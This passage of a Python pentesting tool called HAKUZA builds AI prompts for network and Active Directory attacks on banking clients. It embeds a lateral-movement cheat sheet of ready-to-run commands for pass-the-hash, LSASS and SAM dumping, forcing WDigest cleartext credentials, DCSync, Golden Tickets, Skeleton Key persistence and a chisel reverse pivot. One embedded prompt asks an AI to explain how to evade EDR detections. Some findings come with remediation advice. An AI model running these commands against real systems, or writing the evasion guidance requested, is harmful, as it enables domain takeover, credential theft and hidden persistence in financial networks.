            f"[bold]Client:[/bold]      {eng['client']}\n"
            f"[bold]Range:[/bold]       {cidr_range}\n"
            f"[bold]Profile:[/bold]     {profile}\n"
            f"[bold]Nmap cmd:[/bold]    {nmap_cmds[profile]}",
            title="[bold blue]  HAKUZA — Network Pentest[/bold blue]",
            border_style="blue",
            expand=False,
        )
    )

    # ------------------------------------------------------------------
    # Tool availability check
    # ------------------------------------------------------------------
    tools_needed = {
        "nmap":          shutil.which("nmap"),
        "crackmapexec":  shutil.which("crackmapexec") or shutil.which("cme"),
        "responder":     shutil.which("responder"),
        "impacket-ntlmrelayx": shutil.which("ntlmrelayx.py") or shutil.which("impacket-ntlmrelayx"),
        "evil-winrm":    shutil.which("evil-winrm"),
        "chisel":        shutil.which("chisel"),
        "ligolo-ng":     shutil.which("ligolo-proxy"),
        "mitm6":         shutil.which("mitm6"),
    }

    tool_table = Table(
        title="Network Tool Status",
        box=box.SIMPLE,
        show_header=True,
        header_style="bold",
        expand=False,
    )
    tool_table.add_column("Tool", style="bold white", width=22)
    tool_table.add_column("Status", width=14)

    for tool_name, path in sorted(tools_needed.items()):
        status = "[green]FOUND[/green]" if path else "[yellow]NOT FOUND[/yellow]"
        tool_table.add_row(tool_name, status)

    console.print(tool_table)

    # ------------------------------------------------------------------
    # AI playbook
    # ------------------------------------------------------------------
    console.print(Rule("[bold cyan]AI-Generated Network Pentest Playbook[/bold cyan]", style="dim cyan"))

    prompt = (
        f"You are conducting a network penetration test for a BFSI client.\n\n"
        f"Engagement: {eng['name']}\n"
        f"Client: {eng['client']}\n"
        f"Target range: {cidr_range}\n"
        f"Scan profile: {profile}\n"
        f"Nmap base command: {nmap_cmds[profile]}\n\n"
        f"Use the following network pentest playbook as your foundation and expand on it "
        f"with BFSI-specific context (core banking, SWIFT, payment terminal networks):\n\n"
        f"{_NETWORK_PHASES_STATIC}\n\n"
        f"For each protocol/service section:\n"
        f"1. Confirm the exact copy-paste command using {cidr_range} as the range.\n"
        f"2. State what a successful result looks like (exact output pattern).\n"
        f"3. Map the finding to a CVSS score, CWE, and MITRE ATT&CK technique ID.\n"
        f"4. Provide a BFSI-specific risk note (e.g. 'A compromised MSSQL on the payments "
        f"   VLAN could expose PCI-DSS card data').\n\n"
        f"## Common Credentials to Try\n"
        f"Include this table in your output:\n"
        f"| Service | Username | Password |\n"
        f"|---------|----------|----------|\n"
        + "\n".join(f"| auto | {u} | {p} |" for u, p in _NETWORK_COMMON_CREDS)
        + f"\n\nEnd with a 'Prioritised Attack Order' — ordered list of which ports/services "
        f"to hit first given a BFSI network, with one-line rationale each."
    )

    response = stream_to_console(
        client,
        [{"role": "user", "content": prompt}],
        max_tokens=4096,
        console=console,
    )

    # ------------------------------------------------------------------
    # Save to file
    # ------------------------------------------------------------------
    if do_save and response:
        ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        eng_dir = HAKUZA_DIR / "engagements" / eng["name"]
        reports_dir = eng_dir / "reports"
        reports_dir.mkdir(parents=True, exist_ok=True)
        out_path = reports_dir / f"network_playbook_{ts}.md"
        header = (
            f"# Network Pentest Playbook — {eng['name']}\n"
            f"**Date:** {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}\n"
            f"**Range:** {cidr_range}  |  **Profile:** {profile}\n\n---\n\n"
        )
        out_path.write_text(header + response)
        console.print(f"\n[green]Playbook saved:[/green] {out_path}")

    # ------------------------------------------------------------------
    # Offer to log network findings
    # ------------------------------------------------------------------
    console.print()
    console.print(Rule("[bold yellow]Log Network Findings[/bold yellow]", style="dim yellow"))

    net_findings = [
        ("SMB Null Session / Weak Signing", "medium", 5.3,
         "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", "CWE-306", "T1135",
         "SMB null sessions or disabled SMB signing allow unauthenticated share "
         "enumeration and NTLM relay attacks.",
         "Enforce SMB signing via GPO; disable null sessions "
         "(RestrictAnonymous=2, RestrictAnonymousSAM=1)."),
        ("NTLM Relay / Responder Poisoning", "high", 8.1,
         "AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "CWE-294", "T1557.001",
         "NetNTLM hashes captured via Responder and relayed to hosts without SMB "
         "signing, enabling lateral movement without credential cracking.",
         "Enable SMB signing everywhere; block LLMNR and NBT-NS via GPO; "
         "deploy Microsoft Defender for Identity to detect relay attacks."),
        ("Unauthenticated Service Exposure", "high", 7.5,
         "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "CWE-306", "T1190",
         "Critical internal services (Redis, MongoDB, Elasticsearch, Jenkins) "
         "accessible without authentication on the internal network.",
         "Enforce authentication on all internal services; segment with firewall "
         "ACLs; apply vendor hardening guides for each service."),
        ("IPv6 Misconfiguration (mitm6)", "high", 8.8,
         "AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "CWE-290", "T1557.003",
         "IPv6 enabled but unmanaged; mitm6 can poison WPAD via DHCPv6 and relay "
         "credentials to Domain Controllers over LDAPS.",
         "Disable IPv6 via GPO if not in use (Registry: DisabledComponents=0xFF); "
         "or deploy DHCPv6 snooping and RA Guard."),
        ("Default / Weak Credentials on Network Services", "critical", 9.8,
         "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "CWE-1392", "T1078",
         "Network services (MSSQL sa, Redis, Jenkins, Tomcat) using default or "
         "trivially guessable passwords accessible from the internal network.",
         "Rotate all service account passwords to 20+ char random strings; "
         "enforce MFA where supported; remove default accounts."),
    ]

    try:
        from rich.prompt import Confirm
        log_all = Confirm.ask("Log 5 common network findings now?", default=False)
    except Exception:
        log_all = False

    if log_all:
        for title, sev, cvss, vector, cwe, mitre, desc, rem in net_findings:
            finding = add_finding(
                engagement_id=eng["id"],
                title=f"Network — {title}",
                severity=sev,
                cvss_score=cvss,
                cvss_vector=vector,
                cwe=cwe,
                mitre=mitre,
                description=desc,
                remediation=rem,
                tool="hakuza-network",
                url=cidr_range,
            )
            console.print(
                f"  [green]Logged:[/green] {sev_badge(sev)}  "
                f"[bold]{finding.get('short_id', '')}[/bold]  Network — {title}"
            )
        console.print(
            "\n[green]5 network findings saved.[/green] "
            "Edit with [cyan]hakuza update <short_id>[/cyan]."
        )
    else:
        console.print("[dim]Skipped. Use [bold]hakuza add[/bold] to log findings manually.[/dim]")

    console.print()
    console.print(
        Panel(
            f"[bold green]Network playbook complete.[/bold green]\n\n"
            f"Tip: Import nmap XML results with [cyan]hakuza import hakuza_quick.xml[/cyan].\n"
            f"Next: [cyan]hakuza ad --dc <DC_IP> --domain <DOMAIN>[/cyan] if AD is detected.",
            title="[bold]Done[/bold]",
            border_style="green",
            expand=False,
        )
    )


# ---------------------------------------------------------------------------
# LATERAL MOVEMENT DECISION TREE (static reference)
# ---------------------------------------------------------------------------

_LATERAL_DECISION_TREE = r"""\
## Lateral Movement Decision Tree

### You have: PLAINTEXT CREDENTIALS (domain user)
```bash
# Validate scope
crackmapexec smb <RANGE>/24 -u <USER> -p '<PASS>' 2>/dev/null | grep '+'

# Remote command execution
impacket-wmiexec <DOMAIN>/<USER>:'<PASS>'@<TARGET>
impacket-psexec  <DOMAIN>/<USER>:'<PASS>'@<TARGET>
evil-winrm -i <TARGET> -u <USER> -p '<PASS>'

# Dump SAM/LSASS on reachable hosts (local admin required)
crackmapexec smb <TARGET> -u <USER> -p '<PASS>' --sam
crackmapexec smb <TARGET> -u <USER> -p '<PASS>' --lsa
```

### You have: NTLM HASH ONLY (no plaintext)
```bash
# PTH via CrackMapExec
crackmapexec smb <RANGE>/24 -u <USER> -H <NT_HASH> 2>/dev/null | grep '+'

# PTH remote shell
impacket-psexec  -hashes :<NT_HASH> <DOMAIN>/<USER>@<TARGET>
impacket-wmiexec -hashes :<NT_HASH> <DOMAIN>/<USER>@<TARGET>
evil-winrm -i <TARGET> -u <USER> -H <NT_HASH>

# PTH with Mimikatz (Windows)
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NT_HASH> /run:cmd.exe
```

### You have: KERBEROS TGT (ccache or kirbi file)
```bash
# Inject ccache (Linux)
export KRB5CCNAME=/path/to/<USER>.ccache
impacket-psexec  <DOMAIN>/<USER>@<TARGET> -k -no-pass
impacket-wmiexec <DOMAIN>/<USER>@<TARGET> -k -no-pass
impacket-smbclient <DOMAIN>/<USER>@<TARGET> -k -no-pass

# Inject kirbi (Windows — Rubeus)
Rubeus.exe ptt /ticket:<base64_or_path_to.kirbi>
klist   # verify injection

# Inject kirbi (Windows — Mimikatz)
kerberos::ptt <ticket.kirbi>
```

### You have: SHELL ON TARGET BOX (interactive shell)
```bash
# Enumerate local creds
reg save HKLM\\SAM   C:\\Temp\\sam.hive
reg save HKLM\\SYSTEM C:\\Temp\\sys.hive
# Exfil and parse: impacket-secretsdump -sam sam.hive -system sys.hive LOCAL

# Mimikatz (if AV permits)
privilege::debug
sekurlsa::logonpasswords
lsadump::sam

# WDigest clear-text creds (enable if target is pre-2012 R2)
reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest \
  /v UseLogonCredential /t REG_DWORD /d 1 /f
# Wait for user to re-authenticate, then: sekurlsa::logonpasswords

# Process token impersonation (PowerShell)
Invoke-TokenManipulation -ImpersonateUser -Username "<DOMAIN>\\<DA_USER>"
```

### You have: LOCAL ADMIN (but NOT domain admin)
```bash
# Token impersonation — look for domain user sessions
Invoke-TokenManipulation -Enumerate   # list available tokens
Invoke-TokenManipulation -ImpersonateUser -Username "<DOMAIN>\\<USER>"

# LSASS dump for domain creds in memory
procdump.exe -ma lsass.exe lsass.dmp   # if allowed by AV
# Or Task Manager > Details > LSASS > right-click > Create Dump File

# Check for cached domain creds
crackmapexec smb 127.0.0.1 -u <LOCAL_USER> -p '<PASS>' --lsa

# Check for unattended install files, web.config, etc.
findstr /si password C:\\*.xml C:\\*.ini C:\\*.config C:\\inetpub\\wwwroot\\*.* 2>NUL
Get-ChildItem -Path C:\\ -Recurse -ErrorAction SilentlyContinue \
  -Include "web.config","*.config","unattend.xml" | Select-String "password"
```

### You have: DOMAIN USER (no admin anywhere yet)
```bash
# AS-REP / Kerberoast from your user context
impacket-GetNPUsers <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request \
  -format hashcat -outputfile asrep.txt
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request \
  -outputfile kerberoast.txt

# BloodHound data collection
bloodhound-python -u <USER> -p '<PASS>' -d <DOMAIN> -ns <DC_IP> -c All --zip

# Find computers you can access
crackmapexec smb <RANGE>/24 -u <USER> -p '<PASS>' 2>/dev/null | grep '+'

# ACL enumeration — dangerous rights from your account
# In BloodHound: your node → Outbound Control Rights

# Password in description attribute (common BFSI misconfiguration)
ldapsearch -x -H ldap://<DC_IP> -D "<USER>@<DOMAIN>" -w '<PASS>' \
  -b "DC=<DC>,DC=<TLD>" "(description=*pass*)" sAMAccountName description
```

### You have: DOMAIN ADMIN
```bash
# DCSync — dump all hashes
impacket-secretsdump <DOMAIN>/<DA_USER>:'<PASS>'@<DC_IP> -just-dc-ntlm \
  -outputfile ntds_all_hashes.txt

# Golden Ticket (krbtgt hash from DCSync)
impacket-ticketer -nthash <KRBTGT_NTLM> -domain-sid <DOMAIN_SID> \
  -domain <DOMAIN> Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec <DOMAIN>/Administrator@<ANY_HOST> -k -no-pass

# Enable RDP everywhere (for persistence/visibility)
crackmapexec smb <RANGE>/24 -u <DA_USER> -p '<PASS>' -M rdp -o ACTION=enable

# Dump all workstation LSASS (credential harvest)
crackmapexec smb <RANGE>/24 -u <DA_USER> -p '<PASS>' --lsa
crackmapexec smb <RANGE>/24 -u <DA_USER> -p '<PASS>' --sam

# Deploy Skeleton Key for persistence
impacket-psexec <DOMAIN>/<DA_USER>:'<PASS>'@<DC_IP>
# Then upload and exec Mimikatz: misc::skeleton
# Any account can now auth with password: mimikatz
```
"""


# ---------------------------------------------------------------------------
# cmd_lateral
# ---------------------------------------------------------------------------

def cmd_lateral(args, console) -> None:
    """
    hakuza lateral [--technique <technique>] [--from-host <host>] [--to-host <host>]

    Generates a lateral movement decision tree based on the access you currently have.
    Prompts for current access type, shows exact commands for each scenario.
    """
    eng = _require_engagement(console)
    client = get_client()

    technique = getattr(args, "technique",  None)
    from_host = getattr(args, "from_host",  None) or "<SOURCE_HOST>"
    to_host   = getattr(args, "to_host",    None) or "<TARGET_HOST>"

    console.print(
        Panel(
            f"[bold]Engagement:[/bold]  {eng['name']}\n"
            f"[bold]Client:[/bold]      {eng['client']}\n"
            f"[bold]From host:[/bold]   {from_host}\n"
            f"[bold]To host:[/bold]     {to_host}\n"
            + (f"[bold]Technique:[/bold]   {technique}" if technique else
               "[bold]Technique:[/bold]   (all — decision tree mode)"),
            title="[bold yellow]  HAKUZA — Lateral Movement[/bold yellow]",
            border_style="yellow",
            expand=False,
        )
    )

    # ------------------------------------------------------------------
    # Print static decision tree first (always useful)
    # ------------------------------------------------------------------
    console.print(Rule("[bold cyan]Lateral Movement Decision Tree[/bold cyan]", style="dim cyan"))
    console.print(Markdown(_LATERAL_DECISION_TREE))

    # ------------------------------------------------------------------
    # Prompt user for current access context
    # ------------------------------------------------------------------
    console.print()
    console.print(Rule("[bold yellow]AI Lateral Movement Analysis[/bold yellow]", style="dim yellow"))
    console.print("[bold]Describe your current access context[/bold] (press Enter to skip AI analysis):")
    console.print(
        "[dim]Examples:\n"
        "  'I have NTLM hash for jdoe, local admin on WS01, domain user in Finance OU'\n"
        "  'Shell on WS01 as NT AUTHORITY\\SYSTEM, no domain creds yet'\n"
        "  'Domain admin via Kerberoast, need to reach air-gapped SWIFT server at 10.2.5.10'[/dim]"
    )

    try:
        from rich.prompt import Prompt
        access_context = Prompt.ask("[bold cyan]Current access[/bold cyan]", default="")
    except (KeyboardInterrupt, EOFError):
        access_context = ""

    if not access_context.strip():
        console.print("[dim]Skipping AI analysis — no context provided.[/dim]")
        _print_lateral_technique_table(console)
        return

    # ------------------------------------------------------------------
    # AI-personalised lateral movement analysis
    # ------------------------------------------------------------------
    domain = eng.get("target", "<DOMAIN>")

    prompt = (
        f"You are advising a CRTP-certified penetration tester on lateral movement.\n\n"
        f"Engagement: {eng['name']}\n"
        f"Client: {eng['client']} (BFSI environment)\n"
        f"Source host: {from_host}\n"
        f"Target host: {to_host}\n"
        f"Technique requested: {technique or 'all applicable'}\n\n"
        f"Current access context:\n{access_context}\n\n"
        f"Reference decision tree:\n{_LATERAL_DECISION_TREE}\n\n"
        f"Based on the access context above, produce:\n\n"
        f"## 1. Recommended Lateral Movement Path\n"
        f"Step-by-step path from {from_host} to {to_host} given the stated access. "
        f"Each step: technique name, exact copy-paste command, expected output, MITRE TTP.\n\n"
        f"## 2. Alternative Paths (if primary path is blocked)\n"
        f"2–3 fallback techniques with commands.\n\n"
        f"## 3. BFSI-Specific Risks\n"
        f"If this lateral movement succeeds, what BFSI systems could be impacted "
        f"(core banking, SWIFT, payment gateway, regulatory audit trail)?\n\n"
        f"## 4. Detection Signatures to Avoid\n"
        f"3 specific Windows Event IDs / EDR detections triggered by the primary path, "
        f"and how to evade or reduce noise for each.\n\n"
        f"## 5. Immediate Next Actions After Success\n"
        f"What to do first once you land on {to_host} — persistence, credential harvest, "
        f"further pivoting.\n\n"
        f"All commands must be copy-paste ready with specific syntax."
    )

    response = stream_to_console(
        client,
        [{"role": "user", "content": prompt}],
        max_tokens=3000,
        console=console,
    )

    # ------------------------------------------------------------------
    # Technique quick-reference table
    # ------------------------------------------------------------------
    console.print()
    _print_lateral_technique_table(console)

    # ------------------------------------------------------------------
    # Offer to log a lateral movement finding
    # ------------------------------------------------------------------
    console.print()
    console.print(Rule("[bold yellow]Log Lateral Movement Finding[/bold yellow]", style="dim yellow"))

    try:
        from rich.prompt import Confirm
        log_it = Confirm.ask(
            f"Log a lateral movement finding ({from_host} → {to_host})?",
            default=False,
        )
    except Exception:
        log_it = False

    if log_it:
        try:
            sev_input = Prompt.ask(
                "Severity",
                choices=["critical", "high", "medium", "low"],
                default="high",
            )
        except Exception:
            sev_input = "high"

        cvss_map = {"critical": 9.0, "high": 8.1, "medium": 6.1, "low": 3.7}
        vector_map = {
            "critical": "AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H",
            "high":     "AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
            "medium":   "AV:A/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
            "low":      "AV:A/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N",
        }

        title_text = (
            f"Lateral Movement: {technique or 'Credential-Based'} "
            f"({from_host} → {to_host})"
        )
        desc_text = (
            f"Tester successfully moved laterally from {from_host} to {to_host} "
            f"using technique: {technique or 'credential reuse / PTH'}.\n\n"
            f"Access context: {access_context[:300] if access_context else 'See AI analysis above.'}"
        )

        finding = add_finding(
            engagement_id=eng["id"],
            title=title_text,
            severity=sev_input,
            cvss_score=cvss_map.get(sev_input, 8.1),
            cvss_vector=vector_map.get(sev_input, "AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"),
            cwe="CWE-269",
            mitre="T1550",
            description=desc_text,
            remediation=(
                "Enforce least privilege and tiered administration model (Tier 0/1/2). "
                "Enable Credential Guard and LSA Protection. "
                "Deploy Privileged Access Workstations (PAW) for admin tasks. "
                "Monitor lateral movement indicators: Event IDs 4624 (type 3), 4648, 7045."
            ),
            tool="hakuza-lateral",
            url=f"{from_host} → {to_host}",
        )
        console.print(
            f"\n[green]Logged:[/green] {sev_badge(sev_input)}  "
            f"[bold]{finding.get('short_id', '')}[/bold]  {title_text}"
        )
    else:
        console.print("[dim]Skipped.[/dim]")

    console.print()
    console.print(
        Panel(
            "[bold green]Lateral movement analysis complete.[/bold green]\n\n"
            "Next: [cyan]hakuza ad[/cyan] to escalate to Domain Admin,\n"
            "or    [cyan]hakuza findings[/cyan] to review all logged findings.",
            title="[bold]Done[/bold]",
            border_style="green",
            expand=False,
        )
    )


def _print_lateral_technique_table(console) -> None:
    """Print a concise lateral movement technique quick-reference table."""
    console.print(Rule("[bold magenta]Technique Quick Reference[/bold magenta]", style="dim magenta"))

    table = Table(
        title="Lateral Movement Techniques",
        box=box.ROUNDED,
        show_header=True,
        header_style="bold magenta",
        expand=True,
    )
    table.add_column("Technique", style="bold white", ratio=1)
    table.add_column("Requires", ratio=1)
    table.add_column("Noisiness", width=11)
    table.add_column("MITRE TTP", width=12)
    table.add_column("Key Command Hint", ratio=2, style="cyan", overflow="fold")

    techniques = [
        ("Pass-the-Hash (PTH)",
         "NTLM hash, local/domain admin",
         "[yellow]Medium[/yellow]",
         "T1550.002",
         "crackmapexec smb <TARGET> -u <USER> -H <HASH>"),
        ("Pass-the-Ticket (PTT)",
         "Kerberos TGT/TGS (.ccache/.kirbi)",
         "[green]Low[/green]",
         "T1550.003",
         "export KRB5CCNAME=user.ccache; impacket-psexec ... -k -no-pass"),
        ("Over-Pass-the-Hash (PTK)",
         "AES256/RC4 key (from lsass/NTDS)",
         "[green]Low[/green]",
         "T1550.003",
         "Rubeus.exe asktgt /user:X /aes256:KEY /opsec /ptt"),
        ("WMI Execution",
         "Domain user + local admin",
         "[green]Low[/green]",
         "T1021.006",
         "impacket-wmiexec DOMAIN/USER:'PASS'@TARGET"),
        ("PSExec",
         "NTLM hash or plaintext + admin$",
         "[red]High[/red]",
         "T1021.002",
         "impacket-psexec DOMAIN/USER:'PASS'@TARGET"),
        ("atexec (Scheduled Task)",
         "Domain user + local admin",
         "[yellow]Medium[/yellow]",
         "T1053.005",
         "impacket-atexec DOMAIN/USER:'PASS'@TARGET 'whoami'"),
        ("Evil-WinRM (WinRM)",
         "Domain user + WinRM access",
         "[yellow]Medium[/yellow]",
         "T1021.006",
         "evil-winrm -i TARGET -u USER -p PASS"),
        ("NTLM Relay",
         "Adjacent network, no SMB signing",
         "[yellow]Medium[/yellow]",
         "T1557.001",
         "responder -I eth0 -wdF; ntlmrelayx -tf targets.txt"),
        ("DCSync",
         "DCSync ACL rights on domain",
         "[red]High[/red]",
         "T1003.006",
         "impacket-secretsdump DOMAIN/USER:PASS@DC -just-dc-ntlm"),
        ("Golden Ticket",
         "krbtgt NTLM hash + domain SID",
         "[green]Low[/green]",
         "T1558.001",
         "impacket-ticketer -nthash KRBTGT_HASH -domain-sid SID -domain DOMAIN Admin"),
        ("Token Impersonation",
         "SeImpersonatePrivilege / local admin",
         "[yellow]Medium[/yellow]",
         "T1134.001",
         "Invoke-TokenManipulation -ImpersonateUser -Username DOMAIN\\DA"),
        ("SSH Tunnel / Chisel Pivot",
         "SSH/HTTP outbound from pivot",
         "[green]Low[/green]",
         "T1572",
         "chisel server -p 8000 --reverse (attacker); chisel client IP:8000 R:1080:socks"),
    ]

    for row in techniques:
        table.add_row(*row)

    console.print(table)


# ---------------------------------------------------------------------------
# ARGPARSE ADDITIONS — paste into build_parser() in hakuza.py
# ---------------------------------------------------------------------------
#
#   p_ad = sub.add_parser("ad", help="Active Directory pentest playbook (CRTP-grade)")
#   p_ad.add_argument("--dc",     metavar="IP",     help="Domain Controller IP address")
#   p_ad.add_argument("--domain", metavar="DOMAIN", help="Active Directory domain name")
#   p_ad.add_argument("--user",   metavar="USER",   help="Starting domain user (if any)")
#   p_ad.add_argument("--save",   action="store_true", help="Save playbook to reports/")
#
#   p_network = sub.add_parser("network", help="Network pentest playbook (nmap → MITM → pivot)")
#   p_network.add_argument("--range",   metavar="CIDR",    help="Target IP range (e.g. 10.0.0.0/24)")
#   p_network.add_argument("--profile", metavar="PROFILE", default="quick",
#                          choices=["quick", "full", "stealth"],
#                          help="Scan profile: quick (default), full, stealth")
#   p_network.add_argument("--save", action="store_true", help="Save playbook to reports/")
#
#   p_lateral = sub.add_parser("lateral", help="Lateral movement decision tree + AI analysis")
#   p_lateral.add_argument("--technique",  metavar="TECHNIQUE", help="Specific technique (pth, ptt, wmi, etc.)")
#   p_lateral.add_argument("--from-host",  metavar="HOST",      help="Source host / IP")
#   p_lateral.add_argument("--to-host",    metavar="HOST",      help="Target host / IP")

# ---------------------------------------------------------------------------
# DISPATCH ADDITIONS — paste into dispatch dict in main() in hakuza.py
# ---------------------------------------------------------------------------
#
#   "ad":      cmd_ad,
#   "network": cmd_network,
#   "lateral": cmd_lateral,

# END mod_ad_network.py
